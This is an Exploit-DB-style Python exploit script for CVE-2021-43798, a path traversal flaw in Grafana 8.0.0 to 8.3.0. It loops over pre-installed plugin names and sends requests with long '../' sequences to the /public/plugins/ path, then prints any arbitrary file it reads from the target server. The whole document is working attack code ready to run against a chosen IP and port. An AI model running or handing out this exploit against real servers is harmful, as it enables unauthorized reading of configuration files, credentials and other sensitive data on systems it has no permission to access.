# Exploit Title: Grafana 8.0.0 - 8.3.0 Path Traversal
# Date: 11.12.2021
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://grafana.com/
# Version: Grafana 8.0.0, Grafana 8.0.0-beta1 - 8.3.0
# CVE: CVE-2021-43798
# Tested on: Grafana 8.2.0

# Vulnerability: Grafana lets use directory traversal via vulnerable plugin directory. Since Grafana comes with pre-installed plugins, most of instances are vulnerable.

#!/usr/bin/python
import sys
import re
import argparse
import pyfiglet
import requests
import time

banner = pyfiglet.figlet_format("CVE-2021-43798")
print(banner)
print('Exploit for CVE-2021-43798')
print('For: Grafana 8.0.0-beta1 - 8.3.0')

class Exploit:

	def __init__(self, target_ip, target_port, file_read):
		self.target_ip = target_ip
		self.target_port = target_port
		self.file_read = file_read

	def check_vuln(self):
		vuln_plugins = ['alertlist', 'annolist', 'barchart','bargauge','candlestick','cloudwatch','dashlist','elasticsearch','gauge','geomap','gettingstarted','grafana-azure-monitor-datasource','graph','heatmap','histogram','influxdb','jaeger','logs','loki','mssql','mysql','news','nodeGraph','opentsdb','piechart','pluginlist','postgres','prometheus','stackdriver','stat','state-timeline','status-history','table','table-old','tempo','testdata','text','timeseries','welcome','zipkin']

		for plugin in vuln_plugins:
			headers = {
                	'User-Agent': 'Mozarella/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
                	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                	'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
                	'Accept-Encoding': 'gzip, deflate',
                	'Connection': 'close',
                	'Content-Type': 'text/html;charset=UTF8',
                	'Upgrade-Insecure-Requests': '1',
                	'Cache-Control': 'max-age=0'
                	}
			url = "http://" + target_ip + ':' + target_port + '/public/plugins/' + plugin + '/../../../../../../../../../../../../../../../../../' + file_read
			print("[*] Checking if " + plugin + " is installed...")
			r = requests.get(url, headers)
			if (r.status_code == 200):
				print("[+] Plugin " + plugin + " found!")
				time.sleep(1)
				print("[*] Showing the contents of " + file_read)
				print(r.text)
				break
			else:
				print("[-] Plugin " + plugin + " not found or error occured!")
				time.sleep(1)

def get_args():
	parser = argparse.ArgumentParser(description='Grafana 8.0.0 Path Traversal')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-f', '--file', dest="file_read", required=True, action='store', help='File to read')
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
file_read = args.file_read

exp = Exploit(target_ip, target_port, file_read)
exp.check_vuln()
